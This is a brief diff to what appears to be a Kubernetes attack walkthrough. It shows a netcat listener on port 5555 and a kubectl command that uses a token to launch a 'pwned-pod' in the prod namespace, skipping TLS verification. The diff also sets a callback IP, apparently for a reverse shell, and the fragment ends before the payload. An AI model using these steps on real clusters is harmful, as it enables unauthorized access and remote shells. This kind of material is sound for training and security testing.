@@ -77,7 +77,7 @@ ncat -lvnp 5555 &
 ```
 
 ```bash
-CALLBACK_IP=
+CALLBACK_IP=$(hostname -i)
 kubectl --insecure-skip-tls-verify --token=$TOKEN run pwned-pod \
   -n prod \
   --image=ubuntu \
